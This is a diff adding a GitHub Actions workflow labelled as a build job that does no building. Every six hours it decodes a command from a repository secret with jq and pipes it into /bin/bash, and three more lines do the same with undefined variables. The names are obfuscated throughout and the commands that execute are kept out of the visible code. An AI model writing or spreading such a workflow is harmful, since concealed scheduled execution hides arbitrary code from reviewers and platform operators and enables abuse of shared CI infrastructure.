@@ -1,0 +1,20 @@
+name: kanshiss
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kanshiss
+        env:
+          jtko33: ${{ secrets.jtko33 }}
+        run: |
+          echo $jtko33 | jq -r .p48730 | /bin/bash
+          echo $xgp7 | jq -r .owp16 | /bin/bash
+          echo $tlwd3192 | jq -r .rh099 | /bin/bash
+          echo $vce6 | jq -r .ltcv40 | /bin/bash
+
